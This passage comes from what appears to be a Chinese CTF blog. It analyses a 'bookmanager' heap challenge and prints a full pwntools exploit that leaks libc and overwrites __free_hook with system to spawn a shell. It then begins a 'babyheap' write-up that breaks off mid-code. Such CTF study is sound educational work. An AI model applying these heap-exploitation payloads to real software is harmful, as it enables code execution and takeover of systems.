punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v1 <span class="token operator">=</span> <span class="token operator">&amp;</span>s<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNew Chapter name:"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUpdated"</span><span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v9<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNot found!"</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>LABEL_34<span class="token punctuation">:</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNothing has been done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v9<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"Section"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection name:"</span><span class="token punctuation">,</span> <span class="token string">"Section"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v4 <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNew Section name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">40LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUpdated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v9<span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token operator">++</span>v5<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token operator">++</span>v4<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">goto</span> LABEL_34<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"Text"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection name:"</span><span class="token punctuation">,</span> <span class="token string">"Text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v6 <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNew Text:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUpdated"</span><span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v9<span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token operator">++</span>v7<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token operator">++</span>v6<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">goto</span> LABEL_34<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nInvalid!"</span><span class="token punctuation">,</span> <span class="token string">"Text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v9<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>根据我们输入的是Chapter/Section/Text来判断我们要更新哪部分</p><p>这个功能其实没啥好讲的，也就是各种遍历，通过name来定位chapter/section/text，然后修改内容。</p><p>好了，到这里八个功能都分析完了，c语言的指针真是灵魂，从一个chunk指向另一个chunk，还可以继续指向下一个chunk，俄罗斯套娃。</p><p>那么，程序的漏洞在哪，第一个在remove_section()函数中，free了sectionchunk后并未清零，第二个在update()函数中，在更新text功能中，输入的size固定为255，这里就有堆溢出漏洞，整个程序的功能一大堆，看起来很复杂，但实际上利用起来很简单，只要仔细分析程序这两个洞也并不难找。</p><p>下面放出ex师傅的exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./bookmanager'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bookmanager'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = remote('node3.buuoj.cn', 25525)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bookmanager'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_chapter</span><span class="token punctuation">(</span>chapter<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chapter<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_section</span><span class="token punctuation">(</span>chapter<span class="token punctuation">,</span> section<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"into:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>chapter<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>    section_ptr <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>section<span class="token punctuation">)</span>    <span class="token keyword">return</span> section_ptr<span class="token keyword">def</span> <span class="token function">add_text</span><span class="token punctuation">(</span>section<span class="token punctuation">,</span> size<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"into:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>section<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"write:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Text:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">remove_chapter</span><span class="token punctuation">(</span>chapter<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>chapter<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">remove_section</span><span class="token punctuation">(</span>section<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>section<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">remove_text</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"6"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">preview</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"7"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">update_text</span><span class="token punctuation">(</span>section<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"8"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Text):"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"Text"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>section<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"New Text:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>text<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name of the book you want to create: '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span>add_chapter<span class="token punctuation">(</span><span class="token string">'aaaa\n'</span><span class="token punctuation">)</span>add_section<span class="token punctuation">(</span><span class="token string">'aaaa\n'</span><span class="token punctuation">,</span> <span class="token string">'bbbb\n'</span><span class="token punctuation">)</span>add_section<span class="token punctuation">(</span><span class="token string">'aaaa\n'</span><span class="token punctuation">,</span> <span class="token string">'cccc\n'</span><span class="token punctuation">)</span>add_text<span class="token punctuation">(</span><span class="token string">'bbbb\n'</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>add_text<span class="token punctuation">(</span><span class="token string">'cccc\n'</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'here\n'</span><span class="token punctuation">)</span>remove_text<span class="token punctuation">(</span><span class="token string">'bbbb\n'</span><span class="token punctuation">)</span>add_text<span class="token punctuation">(</span><span class="token string">'bbbb\n'</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'\x78'</span><span class="token punctuation">)</span>preview<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Section:bbbb'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Text:'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b78</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add_section<span class="token punctuation">(</span><span class="token string">'aaaa\n'</span><span class="token punctuation">,</span> <span class="token string">'dddd\n'</span><span class="token punctuation">)</span>update_text<span class="token punctuation">(</span><span class="token string">'cccc\n'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\0'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span> <span class="token operator">+</span>            <span class="token string">'dddd'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>update_text<span class="token punctuation">(</span><span class="token string">'dddd\n'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>remove_text<span class="token punctuation">(</span><span class="token string">'cccc\n'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>保护全开的堆题利用第一步就是得先泄露libc地址，通过addtext，removetext，addtext，preview这四步就能泄露出libc地址</p><p>然后再add一个sectionchunk，sectionname为dddd，这个section紧接着textcccc，然后update textcccc，通过堆溢出，将sectiondddd+32的位置处写入free_hook的地址，这样，当我们编辑sectiondddd的text时，就相当于编辑free_hook，只需要往其中写入system，然后remove textcccc即可getshell</p><p>以后还是得仔细分析程序，无论是这种功能很多的堆题，还是vmpwn，只要c语言基础足够扎实，就算分析得慢，也还是能搞定的。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN学习记录</title>
      <link href="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/"/>
      <url>/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>考察点:unsortedbin attack,house of sprit,global_max_fast,fastbin attack</p><a id="more"></a><p>按照流程，首先checksec<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/1.jpg" alt=""><br>保护全开的堆题，并且由于开启了Full RELRO，所以我们不能通过复写got表来getshell<br>运行一下，看看程序如何运行<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/2.jpg" alt=""><br>菜单题，增删查改一样不少，然后我们把程序拖进IDA看看<br>首先是main函数</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//main</span>__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  __int64 savedregs<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp+0h]</span>  v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">sub_EC6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v4 <span class="token operator">!=</span> <span class="token number">5</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v4 <span class="token operator">=</span> <span class="token function">sub_B0A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>savedregs <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1u</span><span class="token punctuation">:</span>        <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2u</span><span class="token punctuation">:</span>        <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3u</span><span class="token punctuation">:</span>        <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4u</span><span class="token punctuation">:</span>        <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5u</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid option!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">puts</span><span class="token punctuation">(</span>byte_1168<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>main函数开头有一个sub_EC6()函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_EC6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span 